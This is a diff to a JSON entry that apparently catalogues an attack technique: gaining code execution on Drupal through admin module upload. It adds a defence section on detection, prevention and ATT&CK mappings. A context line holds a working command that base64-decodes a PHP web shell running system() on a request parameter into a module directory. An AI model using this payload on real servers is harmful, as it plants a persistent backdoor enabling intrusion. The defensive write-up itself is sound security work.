@@ -76,5 +76,16 @@
       "label": "Create webshell via base64 decode (alternative to embedding in module)",
       "command": "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K' | base64 -d > /var/www/html/modules/captcha/shell.php"
     }
-  ]
+  ],
+  "defense": {
+    "why_it_works": "An admin with the 'administer modules' permission can install arbitrary module archives, and Drupal executes module PHP. Bundling a webshell plus a .htaccess that re-enables PHP execution in the module directory yields RCE. The platform trusts uploaded module code by design, so an admin-level compromise becomes server code execution.",
+    "prerequisites": "Drupal admin session with module-install permission (or a compromised admin account); ability to upload/point to a module archive; the web server executes PHP under the module directory.",
+    "impact": "T1190 Exploit Public-Facing Application + T1505.003 Server Software Component: Web Shell \u2014 persistent RCE as the web-server user.",
+    "detection": "New .php (webshell) and .htaccess written under modules/ (file-integrity monitoring / Sysmon 11). Web logs: requests to an unexpected module path returning command output. Drupal watchdog: module install events. Outbound connections from the web-server process.",
+    "prevention": "Restrict 'administer modules' to trusted admins; disable UI module installation in production ($settings['allow_authorize_operations']=FALSE); enforce signed/reviewed modules; make the web root read-only to the runtime user; WAF on /admin.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1190/",
+      "https://attack.mitre.org/techniques/T1505/003/"
+    ]
+  }
 }
